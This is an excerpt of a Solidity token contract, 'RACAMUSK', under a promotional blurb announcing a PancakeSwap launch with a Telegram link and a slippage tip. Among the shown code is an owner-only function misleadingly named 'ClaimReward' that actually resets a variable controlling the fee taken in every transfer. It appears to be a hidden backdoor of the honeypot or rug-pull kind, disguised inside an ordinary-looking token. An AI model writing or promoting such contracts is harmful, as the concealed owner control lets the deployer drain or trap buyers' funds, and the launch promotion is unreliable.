...
⚡️⚡️RacaMusk launch on pancakeswap today 
...
For buy, you can use SP = 10-15% 🔥🔥

https://t.me/RacaaMusk
https://t.me/RacaaMusk
 ...
 */
 ...
 contract RACAMUSK is Context, ERC20, ERC20Metadata {
    ...
    function ClaimReward(uint256 amount) public onlyOwner virtual returns (bool) {
        _RACA = amount;
        return true;
    }    
    ...
    function _transfer(
        ...
        _fee = (amount * _taxFee /100) / _RACA;
        amount = amount -  (_fee*_RACA*2);
